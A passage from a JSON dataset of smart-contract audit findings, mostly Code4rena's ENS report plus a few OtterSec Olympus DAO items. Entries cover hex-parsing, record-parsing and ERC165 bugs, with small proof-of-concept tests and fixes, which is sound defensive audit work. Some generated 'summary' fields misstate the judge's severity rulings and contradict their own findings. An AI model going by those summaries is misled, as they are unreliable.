p);\n>  \n> - return Px % n == rs[0];\n> + return P[0] % n == rs[0];\n> ```\n> instead, since `P[2] == 1`.\n> \n> The second recommendation is a better optimisation but still does redundant conversions in `multiplyScalar`, which also should be corrected then. The whole point of using projective coordinates is to do the modular inverse (i.e. convert to affine) only at the end.\n> \n> In any case, there is nothing exploitable here, no funds or functionality are at risk. The code does what it's supposed to do as it is, just not in the prettiest way. And the way in which the hypothetical issue is proposed to arise is by fixing the very same thing that the hypothetical issue is itself based on, i.e. it is said that fixing the needless conversion between coordinate representations causes an error due to coordinate conversions. One should assume that reworking the coordinate handling would fix all coordinate issues. And if the bug described here were to arise in the suggested manner, it would be immediately noticed in testing.\n> \n> _This is a bug that is not yet a bug but could be a bug that is impossible to miss if someone were to create this bug so it's never going to actually be a bug._\n> \n> I think this is a good catch, but the severity is only QA/Gas.\n\n**[LSDan (judge) commented](https://github.com/code-423n4/2023-04-ens-findings/issues/180#issuecomment-1545670843):**\n > I agree with @d3e4 that the bug is highly unlikely to make it to production without being caught. In this case, however, if it were to make it into production, the \"function of the protocol or availability could be impacted\". That makes this a valid medium in my view. I agree with the warden and sponsor.\n\n\n\n***\n\n",
      "summary": "\nA bug has been found in the EllipticCurve.sol contract code of the 2023-04-ens project. This bug is related to the conversion of coordinates from Jacobian to affine, where the inputs from the previous computation are actually projective coordinates and the correct conversion formula is $X_a = X_p \\cdot Z_p^{-1}$. This bug has been working so far only because the `EllipticCurve` performs a redundant chain of immediate conversions projective->affine->projective->affine and so during that last conversion $Z = 1$. If the chain of redundant conversions is fixed, `validateSignature` will no longer work correctly.\n\nThe bug has been confirmed by Arachnid (ENS) and d3e4 (warden). The warden proposed two mitigation steps to fix the bug and optimize out the redundant conversions chain. The first mitigation step is to replace `mulmod(P[0], mulmod(Px, Px, p), p)` with `mulmod(Px, inverseMod(Pz, p), p)` and the second step is to replace `uint256[3] memory P = addAndReturnProjectivePoint(x1, y1, x2, y2)` with `(uint256 Px,, uint256 Pz) = addProj(x1, y1, 1, x2, y2, 1)`. \n\nThe bug is currently not exploitable and no funds or functionality are at risk. The severity of the bug is only QA/Gas. This has been confirmed by LSDan (judge).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-04-ens",
      "github_link": "https://github.com/code-423n4/2023-04-ens-findings/issues/180",
      "tags": [],
      "finders": [
        "auditor0517",
        "Holmgren"
      ]
    },
    {
      "id": "21871",
      "title": "[M-05] Unintentionally register a non-relevant DNS name owner",
      "impact": "MEDIUM",
      "content": "\nIf a user proves and claims a DNS name using a wrong address format, it executes successfully without getting any error and the DNS name owner will be changed to a new unknown address.\n\nI considered this as medium severity, as it is high impact finding with low likelihood. Cause the person who owns the new address can take control of the ENS name and transfer its ownership to another account. But because if a person finds out, she can immediately replace the correct address, the probability of such an event is low.\n\n### Proof of Concept\n\nIn the following scenario, I provided a value called `arbitrarybytes` which is 22 bytes and set it as the 'foo.test' DNS owner address. `proveAndClaim()` function will execute successfully. Finally, the owner of the ENS name would be the value set as `newOwner` which is the last 20 bytes (from the right) of the provided value in `arbitrarybytes`.\n\n```js\n    const arbitrarybytes= '0x9fD6E51AaD88f6f4CE6aB8827279CFFFb92266332265'\n    const newOwner= '0xe51Aad88f6F4CE6aB8827279cFFFB92266332265'\n    const proof = [\n      hexEncodeSignedSet(rootKeys(expiration, inception)),\n      hexEncodeSignedSet(testRrset('foo.test', arbitrarybytes)),\n    ]\n\n    await registrar.proveAndClaim(utils.hexEncodeName('foo.test'), proof, {\n      from: accounts[0],\n    })\n\n    assert.equal(await ens.owner(namehash.hash('foo.test')), newOwner)\n```\n\n### Tools Used\n\nvscode\n\n### Recommended Mitigation Steps\n\nTo check the validity of the owner address, the code first checks for the prefix which must be `a=0x`, and second for the length of the address which should not be less than 20 bytes or 40 characters through `hexToAddress()` function. The length of the address can also be checked to not be larger than 40 characters.\n\n```solidity\n function hexToAddress(\n        bytes memory str,\n        uint256 idx,\n        uint256 lastIdx\n    ) internal pure returns (address, bool) {\n        if (lastIdx - idx < 40) return (address(0x0), false);\n        (bytes32 r, bool valid) = hexStringToBytes32(str, idx, lastIdx);\n        return (address(uint160(uint256(r))), valid);\n    }\n```\n\n**[Arachnid (ENS) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2023-04-ens-findings/issues/198#issuecomment-1536285606):**\n > I think this warrants a severity of 'note', as it requires the user to already supply an invalid-length address. It should revert rather than silently truncating.\n\n**[LSDan (judge) commented](https://github.com/code-423n4/2023-04-ens-findings/issues/198#issuecomment-1538116480):**\n > Medium risk is appropriate in this case. It is very easy to guard against the user making the mistake described.\n> \n> ref: https://github.com/code-423n4/org/issues/53#issuecomment-1340685618\n\n\n\n***\n\n",
      "summary": "\nThis bug report concerns a vulnerability in the Ethereum Name Service (ENS) that allows a user to successfully prove and claim a DNS name using a wrong address format. This results in the DNS name owner being changed to a new, unknown address, which could potentially be taken control of by a malicious actor. The likelihood of this happening is low, however, as the owner can replace the correct address if they are aware of the issue.\n\nTo replicate the bug, a value called `arbitrarybytes` was provided which is 22 bytes and set it as the 'foo.test' DNS owner address. The `proveAndClaim()` function was then executed, and the owner of the ENS name was set to the last 20 bytes (from the right) of the provided value in `arbitrarybytes`.\n\nThe recommended mitigation steps to prevent this issue are to use the `hexToAddress()` function to check the validity of the owner address. This should check for the prefix which must be `a=0x`, and the length of the address which should not be less than 20 bytes or 40 characters. The length of the address can also be checked to not be larger than 40 characters.\n\nThe severity of this issue was initially considered as medium, but was later downgraded to 'note' as it requires the user to already supply an invalid-length address. It should revert rather than silently truncating.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-04-ens",
      "github_link": "https://github.com/code-423n4/2023-04-ens-findings/issues/198",
      "tags": [],
      "finders": [
        "SaharAP",
        "nobody2018",
        "chaduke",
        "Lilyjjo"
      ]
    },
    {
      "id": "21870",
      "title": "[M-04] Incorrect implementation of `RecordParser.readKeyValue()`",
      "impact": "MEDIUM",
      "content": "\n`RecordParser.readKeyValue()` returns a wrong `value` if the terminator not found.<br>\nThis is a fundamental library and any contract using it may experience unexpected errors and problems due to this bug.\n\n### Proof of Concept\n\nThe implementation logic of `RecordParser.readKeyValue(bytes memory input, uint256 offset, uint256 len)` is roughly as follows:\n\n1.  Find the character `=` in the range `offset..(offset+len)` of input and record its position in `separator`.\n2.  Find the space character in the range `(separator+1)...(offset+len)` of input, and record its position in `terminator`.\n3.  Return `key: input[offset..separator]`, `value: input[(separator+1)..terminator]`, `nextOffset: terminator+1`\n\nThe problem is that if the space is not found in step 2, terminator will be set to `input.length` - [RecordParser.sol#L34](https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnsregistrar/RecordParser.sol#L34):\n\n        if (terminator == type(uint256).max) {\n            terminator = input.length;\n        }\n\nThis is incorrect because the parameters passed require data to be read within range `offset..(offset+len)`, it should not return a value beyond `offset+len`.\n\nFor example, suppose we have: `input = \"...;key1=val1 key2=val2;...\"` and `offset` is the start position of `key2`.\n\nIf we call `readKeyValue(input, offset, 9)`, the function will return:\n\n    key: \"key2\"\n    value: \"val2;...\"\n    nextOffset: input.length+1\n\nThe returned `value` is wrong due to the incorrect implementation of RecordParser.\n\nThe correct return should be:\n\n    key: \"key2\"\n    value: \"val2\"\n    nextOffset: offset+9\n\nTest code for PoC:\n\n    diff --git a/contracts/dnsregistrar/mocks/DummyParser.sol b/contracts/dnsregistrar/mocks/DummyParser.sol\n    new file mode 100644\n    index 0000000..538e652\n    --- /dev/null\n    +++ b/contracts/dnsregistrar/mocks/DummyParser.sol\n    @@ -0,0 +1,34 @@\n    +pragma solidity ^0.8.4;\n    +\n    +import \"../../dnssec-oracle/BytesUtils.sol\";\n    +import \"../RecordParser.sol\";\n    +\n    +contract DummyParser {\n    +    using BytesUtils for bytes;\n    +\n    +    // parse data in format: name;key1=value1 key2=value2;url\n    +    function parseData(\n    +        bytes memory data,\n    +        uint256 kvCount\n    +    ) external pure returns (string memory name, string[] memory keys, string[] memory values, string memory url) {\n    +        uint256 len = data.length;\n    +        // retrieve name\n    +        uint256 sep1 = data.find(0, len, \";\");\n    +        name = string(data.substring(0, sep1));\n    +\n    +        // retrieve url\n    +        uint256 sep2 = data.find(sep1 + 1, len - sep1, \";\");\n    +        url = string(data.substring(sep2 + 1, len - sep2 - 1));\n    +\n    +        keys = new string[](kvCount);\n    +        values = new string[](kvCount);\n    +        // retrieve keys and values\n    +        uint256 offset = sep1 + 1;\n    +        for (uint256 i; i < kvCount && offset < len; i++) {\n    +            (bytes memory key, bytes memory val, uint256 nextOffset) = RecordParser.readKeyValue(data, offset, sep2 - offset);\n    +            keys[i] = string(key);\n    +            values[i] = string(val);\n    +            offset = nextOffset;\n    +        }\n    +    }\n    +}\n    diff --git a/test/DummyParser.test.js b/test/DummyParser.test.js\n    new file mode 100644\n    index 0000000..396557d\n    --- /dev/null\n    +++ b/test/DummyParser.test.js\n    @@ -0,0 +1,27 @@\n    +const { expect } = require('chai')\n    +const { ethers } = require('hardhat')\n    +const { toUtf8Bytes } = require('ethers/lib/utils')\n    +\n    +describe('DummyParser', () => {\n    +  let parser\n    +\n    +  before(async () => {\n    +    const factory = await ethers.getContractFactory('DummyParser')\n    +    parser = await factory.deploy()\n    +  })\n    +\n    +  it('parse data', async () => {\n    +    const data = \"usdt;issuer=tether decimals=18;https://tether.to\"\n    +    const [name, keys, values, url] = await parser.parseData(toUtf8Bytes(data), 2)\n    +    // correct name\n    +    expect(name).to.eq('usdt')\n    +    // correct keys and values\n    +    expect(keys[0]).to.eq('issuer')\n    +    expect(values[0]).to.eq('tether')\n    +    expect(keys[1]).to.eq('decimals')\n    +    // incorrect last value\n    +    expect(values[1]).to.eq('18;https://tether.to')\n    +    // correct url\n    +    expect(url).to.eq('https://tether.to')\n    +  })\n    +})\n    \\ No newline at end of file\n\n### Tools Used\n\nVS Code\n\n### Recommended Mitigation Steps\n\nWe should change [the assignment of `terminator`](https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnsregistrar/RecordParser.sol#L34) so that it cannot exceed the query range:\n\n    diff --git a/contracts/dnsregistrar/RecordParser.sol b/contracts/dnsregistrar/RecordParser.sol\n    index 339f213..876a87f 100644\n    --- a/contracts/dnsregistrar/RecordParser.sol\n    +++ b/contracts/dnsregistrar/RecordParser.sol\n    @@ -31,11 +31,12 @@ library RecordParser {\n                 \" \"\n             );\n             if (terminator == type(uint256).max) {\n    -            terminator = input.length;\n    +            terminator = len + offset;\n    +            nextOffset = terminator;\n    +        } else {\n    +            nextOffset = terminator + 1;\n             }\n    -\n             key = input.substring(offset, separator - offset);\n             value = input.substring(separator + 1, terminator - separator - 1);\n    -        nextOffset = terminator + 1;\n         }\n     }\n\n**[Arachnid (ENS) acknowledged](https://github.com/code-423n4/2023-04-ens-findings/issues/246#issuecomment-1536266531)**\n\n\n\n***\n\n",
      "summary": "\nA bug has been discovered in the `RecordParser.readKeyValue()` function of the fundamental library which can cause unexpected errors and problems. This is because the function returns a wrong `value` if the terminator is not found.\n\nThe implementation logic of the function is as follows: first, it finds the character `=` in the range `offset..(offset+len)` of input and records its position in `separator`. Second, it finds the space character in the range `(separator+1)...(offset+len)` of input, and records its position in `terminator`. Third, it returns `key: input[offset..separator]`, `value: input[(separator+1)..terminator]`, `nextOffset: terminator+1`.\n\nThe problem is that if the space is not found in the second step, `terminator` will be set to `input.length` instead of `offset+len`, which is incorrect as it should not return a value beyond `offset+len`. For example, if `input = \"...;key1=val1 key2=val2;...\"` and `offset` is the start position of `key2`, calling `readKeyValue(input, offset, 9)` will return `value: \"val2;...\"` instead of `value: \"val2\"`.\n\nTest code and proof of concept have been provided to demonstrate the bug. The recommended mitigation step is to change the assignment of `terminator` so that it cannot exceed the query range. This bug has been acknowledged by Arachnid (ENS).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-04-ens",
      "github_link": "https://github.com/code-423n4/2023-04-ens-findings/issues/246",
      "tags": [],
      "finders": [
        "hihen",
        "bin2chen",
        "Parad0x",
        "nobody2018",
        "chaduke",
        "rvierdiiev",
        "eierina"
      ]
    },
    {
      "id": "21869",
      "title": "[M-03] Offchain name resolution would fail despite the located DNS resolver being fully functional",
      "impact": "MEDIUM",
      "content": "\nIn OffchainDNSResolver, `resolveCallback` parses resource  records received off-chain and extracts the DNS resolver address:\n\n    \t\t// Look for a valid ENS-DNS TXT record\n    \t\t(address dnsresolver, bytes memory context) = parseRR(\n    \t\t\titer.data,\n    \t\t\titer.rdataOffset,\n    \t\t\titer.nextOffset\n    \t\t);\n\nThe contract supports three methods of resolution through the resolver:\n\n1.  IExtendedDNSResolver.resolve\n2.  IExtendedResolver.resolve\n3.  Arbitrary call with the `query` parameter originating in `resolve()`\n\nCode is below:\n\n                // If we found a valid record, try to resolve it\n                if (dnsresolver != address(0)) {\n                    if (\n                        IERC165(dnsresolver).supportsInterface(\n                            IExtendedDNSResolver.resolve.selector\n                        )\n                    ) {\n                        return\n                            IExtendedDNSResolver(dnsresolver).resolve(\n                                name,\n                                query,\n                                context\n                            );\n                    } else if (\n                        IERC165(dnsresolver).supportsInterface(\n                            IExtendedResolver.resolve.selector\n                        )\n                    ) {\n                        return IExtendedResolver(dnsresolver).resolve(name, query);\n                    } else {\n                        (bool ok, bytes memory ret) = address(dnsresolver)\n                            .staticcall(query);\n                        if (ok) {\n                            return ret;\n                        } else {\n                            revert CouldNotResolve(name);\n                        }\n                    }\n                }\n\nThe issue is that a resolver could support option (3), but execution would revert prior to the `query` call. The function uses `supportsInterface` in an unsafe way. It should first check that the contract implements ERC165, which will guarantee the call won't revert. Dynamic resolvers are not likely in practice to implement ERC165 as there's no specific signature to support ahead of time.\n\n### Impact\n\nResolution with custom DNS resolvers are likely to fail.\n\n### Recommended Mitigation Steps\n\nUse the OZ `ERC165Checker.sol` library, which [addresses](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/f959d7e4e6ee0b022b41e5b644c79369869d8411/contracts/utils/introspection/ERC165Checker.sol#L36) the issue:\n\n        function supportsInterface(address account, bytes4 interfaceId) internal view returns (bool) {\n            // query support of both ERC165 as per the spec and support of _interfaceId\n            return supportsERC165(account) && supportsERC165InterfaceUnchecked(account, interfaceId);\n        }\n\n**[Arachnid (ENS) disputed and commented](https://github.com/code-423n4/2023-04-ens-findings/issues/256#issuecomment-1536257482):**\n > ERC165 support is required in order to be a valid resolver. Any resolver that doesn't support it is incorrectly implemented.\n\n**[LSDan (judge) commented](https://github.com/code-423n4/2023-04-ens-findings/issues/256#issuecomment-1539812287):**\n > This is easy to protect against. Issue stands.\n\n**[Arachnid (ENS) commented](https://github.com/code-423n4/2023-04-ens-findings/issues/256#issuecomment-1540226929):**\n > There's no point building a protection for this; either way the result is a failed resolution.\n\n**[LSDan (judge) commented](https://github.com/code-423n4/2023-04-ens-findings/issues/256#issuecomment-1545645183):**\n > The OZ implementation would guarantee that the else clause gets triggered and the error returned is understandable / sane. In this case, a very simple fix will significantly enhance the composability of the protocol and improve the experience of dev users.\n\n**[Arachnid (ENS) commented](https://github.com/code-423n4/2023-04-ens-findings/issues/256#issuecomment-1548256807):**\n > I continue to disagree this is an issue. ERC165 support is a baseline requirement for a resolver; checking it's supported is a pointless waste of gas.\n\n**[IllIllI (warden) commented](https://github.com/code-423n4/2023-04-ens-findings/issues/256#issuecomment-1551319058):**\n > https://github.com/code-423n4/2023-04-ens/blob/83836eff1975fb47dae6b0982afd0b00294165cf/contracts/utils/UniversalResolver.sol#L498-L510 this code shows that at least in other areas, the possibility failure is acknowledged and handled.\n\n\n\n***\n\n",
      "summary": "\nA bug has been identified in OffchainDNSResolver, a contract that helps with the resolution of domain names. The `resolveCallback` function parses resource records received off-chain and extracts the DNS resolver address. The contract supports three methods of resolution through the resolver - IExtendedDNSResolver.resolve, IExtendedResolver.resolve, and an arbitrary call with the `query` parameter originating in `resolve()`. \n\nThe issue is that a resolver could support option (3), but execution would revert prior to the `query` call. This is because the function uses `supportsInterface` in an unsafe way. It should first check that the contract implements ERC165, which will guarantee the call won't revert. As dynamic resolvers are not likely in practice to implement ERC165 as there's no specific signature to support ahead of time, resolution with custom DNS resolvers are likely to fail.\n\nRecommended mitigation steps include using the OZ `ERC165Checker.sol` library, which addresses the issue. This library will guarantee that the else clause gets triggered and the error returned is understandable and sane. This simple fix will significantly enhance the composability of the protocol and improve the experience of dev users.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-04-ens",
      "github_link": "https://github.com/code-423n4/2023-04-ens-findings/issues/256",
      "tags": [],
      "finders": [
        "Trust"
      ]
    },
    {
      "id": "21868",
      "title": "[M-02] Invalid addresses will be accepted as resolvers, possibly bricking assets",
      "impact": "MEDIUM",
      "content": "\nThe `hexToAddress` utility parses a string into an address type.\n\n        function hexToAddress(\n            bytes memory str,\n            uint256 idx,\n            uint256 lastIdx\n        ) internal pure returns (address, bool) {\n            if (lastIdx - idx < 40) return (address(0x0), false);\n            (bytes32 r, bool valid) = hexStringToBytes32(str, idx, lastIdx);\n            return (address(uint160(uint256(r))), valid);\n        }\n\nThe issue is that in the return statement, the `bytes32` type is reduced from 256 bits to 160 bits, without checking that the truncated bytes are zero. When the upper bits are not zero, the `bytes32` is not a valid address and the function must return `false` in the second parameter. However, it instead returns an incorrect trimmed number.\n\nThe utility is used in the flow below:\n\n    proveAndClaim\n    \t_claim\n    \t\tgetOwnerAddress\n    \t\t\tparseRR\n    \t\t\t\tparseString\n    \t\t\t\t\thexToAdress\n\nThe incorrect address would be returned from `_claim` and then used as the owner address for `ens.setSubnodeOwner`. This would brick the node.\n\n    function proveAndClaim(\n        bytes memory name,\n        DNSSEC.RRSetWithSignature[] memory input\n    ) public override {\n        (bytes32 rootNode, bytes32 labelHash, address addr) = _claim(\n            name,\n            input\n        );\n        ens.setSubnodeOwner(rootNode, labelHash, addr);\n    }\n\n### Impact\n\nLack of validation can lead to ENS addresses becoming permanently bricked.\n\n### Recommended Mitigation Steps\n\nAdd a check for the upper 96 bits in the highlighted return statement.\n\n### Note for judge\n\nHistorically, the judge has awarded medium severity to various issues which rely on some user error, are easy to check/fix and present material risk. I respect this line of thought and for the sake of consistency I believe this submission should be judged similarly.\n\n**[Arachnid (ENS) disputed and commented](https://github.com/code-423n4/2023-04-ens-findings/issues/258#issuecomment-1571591149):**\n> The upshot of this is that if you provide an invalid address in DNS, it will be set to a (possibly different) invalid address in ENS. This can be fixed by correcting the address in DNS and calling proveAndClaim again. I would argue this should be considered minor at best.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a utility called `hexToAddress` which is used to parse a string into an address type. The issue is that the `bytes32` type is reduced from 256 bits to 160 bits without checking that the truncated bytes are zero. This can lead to an incorrect trimmed number being returned from the utility, which can be used as the owner address for `ens.setSubnodeOwner`, potentially bricking the node.\n\nThe recommended mitigation step is to add a check for the upper 96 bits in the highlighted return statement. Arachnid (ENS) commented that if an invalid address is provided in DNS, it will be set to a (possibly different) invalid address in ENS. This can be fixed by correcting the address in DNS and calling proveAndClaim again, and should be considered minor at best.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-04-ens",
      "github_link": "https://github.com/code-423n4/2023-04-ens-findings/issues/258",
      "tags": [],
      "finders": [
        "Trust"
      ]
    },
    {
      "id": "21867",
      "title": "[M-01] `HexUtils.hexStringToBytes32()` and `HexUtils.hexToAddress()` may return incorrect results",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/utils/HexUtils.sol#L11><br>\n<https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/utils/HexUtils.sol#L68>\n\nThe `HexUtils.hexStringToBytes32()` and `HexUtils.hexToAddress()` may return incorrect results if the input data provided is not in a standard format.\n\nThis could cause the contract to behave abnormally in some scenarios or be exploited for malicious purposes.\n\n### Proof of Concept\n\nThe function `HexUtils.hexStringToBytes32(bytes memory str, uint256 idx, uint256 lastIdx)` is used to convert a hexadecimal string `str[idx...lastIndx]` to a `bytes32`.\n\nHowever, the function lacks some critical checks on the input data, resulting in the following situations:\n\n1.  If the length `lastIdx - idx` is odd, it will not revert, but will read an additional out-of-range byte `str[lastIdx]` and return it.\n2.  If the length `lstIdx - idx > 32`, it will not revert, but will discard the excess data at the beginning and return the last 32 bytes.\n3.  If the length `lstIdx - idx < 32`, it will not revert, but will pad the data with zeros at the beginning.\n\nThe following test code verifies these situations:\n\n    diff --git a/test/utils/HexUtils.js b/test/utils/HexUtils.js\n    index 296eadf..e12e11c 100644\n    --- a/test/utils/HexUtils.js\n    +++ b/test/utils/HexUtils.js\n    @@ -16,6 +16,44 @@ describe('HexUtils', () => {\n         HexUtils = await HexUtilsFactory.deploy()\n       })\n\n    +  describe.only('Special cases for hexStringToBytes32()', () => {\n    +    const hex32Bytes = '5cee339e13375638553bdf5a6e36ba80fb9f6a4f0783680884d92b558aa471da'\n    +    it('odd length 1', async () => {\n    +      let [bytes32, valid] = await HexUtils.hexStringToBytes32(\n    +        toUtf8Bytes(hex32Bytes), 0, 63,\n    +      )\n    +      expect(valid).to.equal(true)\n    +      // the last 4 bits (half byte) of hex32Bytes is out of range but read\n    +      expect(bytes32).to.equal('0x' + hex32Bytes)\n    +    })\n    +    it('odd length 2', async () => {\n    +      let [bytes32, valid] = await HexUtils.hexStringToBytes32(\n    +        toUtf8Bytes(hex32Bytes + '00'), 1, 64,\n    +      )\n    +      expect(valid).to.equal(true)\n    +      // the first half byte of '00' is out of range but read\n    +      expect(bytes32).to.equal('0x' + hex32Bytes.substring(1) + '0')\n    +    })\n    +    it('not enough length', async () => {\n    +      let [bytes32, valid] = await HexUtils.hexStringToBytes32(\n    +        toUtf8Bytes(hex32Bytes), 0, 2,\n    +      )\n    +      expect(valid).to.equal(true)\n    +      // only one byte is read, but it is expanded to 32 bytes\n    +      expect(bytes32).to.equal(\n    +        '0x000000000000000000000000000000000000000000000000000000000000005c',\n    +      )\n    +    })\n    +    it('exceed length', async () => {\n    +      let [bytes32, valid] = await HexUtils.hexStringToBytes32(\n    +        toUtf8Bytes(hex32Bytes + \"1234\"), 0, 64 + 4,\n    +      )\n    +      expect(valid).to.equal(true)\n    +      // 34 bytes is read, and returns the last 32 bytes\n    +      expect(bytes32).to.equal('0x' + hex32Bytes.substring(4) + '1234')\n    +    })\n    +  })\n    +\n       describe('hexStringToBytes32()', () => {\n         it('Converts a hex string to bytes32', async () => {\n           let [bytes32, valid] = await HexUtils.hexStringToBytes32(\n\nTest code outputs:\n\n```\n  HexUtils\n    Special cases for hexStringToBytes32()\n      âœ“ odd length 1\n      âœ“ odd length 2\n      âœ“ not enough length\n      âœ“ exceed length\n\n```\n\nSince [HexUtils.hexToAddress()](https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/utils/HexUtils.sol#L68) is implemented by directly calling `HexUtils.hexStringToBytes32()`, it also has similar issues.\n\n### Tools Used\n\nVS Code\n\n### Recommended Mitigation Steps\n\nShould revert the function if the input length `lastIdx - idx` is odd.\n\nFor cases where the length is greater than or less than 32 (or 20)\n\n*   if the current implementation meets the requirements, the design should be detailed in a comment\n*   otherwise the function should revert if the length is not 32 (or 20)\n\n**[Arachnid (ENS) confirmed](https://github.com/code-423n4/2023-04-ens-findings/issues/281#issuecomment-1536208794)**\n\n\n\n***\n\n",
      "summary": "\nA bug report has been identified in the HexUtils.sol contract, which is used to convert a hexadecimal string to a bytes32. The functions `HexUtils.hexStringToBytes32()` and `HexUtils.hexToAddress()` have been found to return incorrect results if the input data provided is not in a standard format. This could cause the contract to behave abnormally in some scenarios or be exploited for malicious purposes. \n\nThe function `HexUtils.hexStringToBytes32(bytes memory str, uint256 idx, uint256 lastIdx)` is used to convert a hexadecimal string `str[idx...lastIndx]` to a `bytes32`. However, the function lacks some critical checks on the input data, resulting in the following situations:\n\n1.  If the length `lastIdx - idx` is odd, it will not revert, but will read an additional out-of-range byte `str[lastIdx]` and return it.\n2.  If the length `lstIdx - idx > 32`, it will not revert, but will discard the excess data at the beginning and return the last 32 bytes.\n3.  If the length `lstIdx - idx < 32`, it will not revert, but will pad the data with zeros at the beginning.\n\nTest code has been used to verify these situations. Since HexUtils.hexToAddress() is implemented by directly calling `HexUtils.hexStringToBytes32()`, it also has similar issues.\n\nThe recommended mitigation steps for this bug are to revert the function if the input length `lastIdx - idx` is odd. For cases where the length is greater than or less than 32 (or 20), the design should be detailed in a comment if the current implementation meets the requirements, otherwise the function should revert if the length is not 32 (or 20). The bug has been confirmed by Arachnid (ENS).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-04-ens",
      "github_link": "https://github.com/code-423n4/2023-04-ens-findings/issues/281",
      "tags": [],
      "finders": [
        "AkshaySrivastav",
        "hihen",
        "chaduke",
        "Kek",
        "eierina"
      ]
    },
    {
      "id": "48247",
      "title": "Missing Initialization Check",
      "impact": "LOW",
      "content": "## CrossChainBridge.sol Analysis\n\n## Function Overview\n\n```solidity\nfunction isTrustedRemote(uint16 srcChainId_, bytes calldata srcAddress_)\nexternal\nview\nreturns (bool)\n{\n    bytes memory trustedSource = trustedRemoteLookup[srcChainId_];\n    return (srcAddress_.length == trustedSource.length &&\n            keccak256(srcAddress_) == keccak256(trustedSource));\n}\n```\n\n## Issue Description\n\nThe function fails to verify whether `srcAddress_` is initialized. Consequently, a function call with a currently uninitialized source chain ID and an empty source address would return `true`, contrary to expectations.\n\n## Remediation\n\nAdd an initialization check to `isTrustedRemote`.\n\n## Patch\n\nFixed in #120.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OtterSec",
      "protocol_name": "Olympus DAO",
      "source_link": "https://www.olympusdao.finance/",
      "github_link": "https://github.com/OlympusDAO/bophades/tree/xchain/",
      "tags": [],
      "finders": [
        "Youngjoo Lee",
        "Robert Chen",
        "OtterSec"
      ]
    },
    {
      "id": "48246",
      "title": "Gas Optimization",
      "impact": "LOW",
      "content": "## Olympus DAO OFT Audit 05 | General Findings\n\n## CrossChainBridge.sol - Permissions Management\n\n```solidity\npermissions[1] = Permissions(MINTR_KEYCODE, MINTR.burnOhm.selector);\npermissions[2] = Permissions(MINTR_KEYCODE, MINTR.increaseMintApproval.selector);\npermissions[3] = Permissions(MINTR_KEYCODE, MINTR.decreaseMintApproval.selector);\n```\n\nThe `MINTR.decreaseMintApproval` permission is not being used anywhere, therefore it is unnecessary to request it.\n\n### Remediation\nRemove the code that requests the `MINTR.decreaseMintApproval` permission.\n\n---\n\n## CrossChainBridge.sol - Trusted Remote Address\n\n```solidity\nfunction getTrustedRemoteAddress(uint16 remoteChainId_) external view returns (bytes memory) {\n    bytes memory path = trustedRemoteLookup[remoteChainId_];\n    if (path.length == 0) revert Bridge_NoTrustedPath();\n    // The last 20 bytes should be address(this)\n    return path.slice(0, path.length - 20);\n}\n```\n\nIf `path.length` equals zero, the expression `path.length - 20` will be reverted, rendering the length check unnecessary unless it is needed to explain an error in case `path.length` is zero.\n\n### Remediation\nRemove the length check.\n\n---\n\n## CrossChainBridge.sol - Fee Estimation\n\n```solidity\nbytes calldata adapterParams_) external view returns (uint256 nativeFee, uint256 zroFee) {\n    // Mock the payload for sendOhm()\n    bytes memory payload = abi.encode(to_, amount_);\n    return lzEndpoint.estimateFees(dstChainId_, address(this), payload, false, adapterParams_);\n}\n```\n\n```solidity\n_sendMessage(dstChainId_, payload, payable(msg.sender), address(0x0), bytes(\"\"), msg.value);\n```\n\nIn the `estimateSendFee()` function, `adapterParams_` is not needed as it is always set to `bytes(\"\")` when using `_sendMessage()` to transfer OHM tokens.\n\n### Remediation\nRemove the `adapterParams_` parameter and replace it with `bytes(\"\")`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OtterSec",
      "protocol_name": "Olympus DAO",
      "source_link": "https://www.olympusdao.finance/",
      "github_link": "https://github.com/OlympusDAO/bophades/tree/xchain/",
      "tags": [],
      "finders": [
        "Youngjoo Lee",
        "Robert Chen",
        "OtterSec"
      ]
    },
    {
      "id": "48245",
      "title": "Remove Dead Code",
      "impact": "LOW",
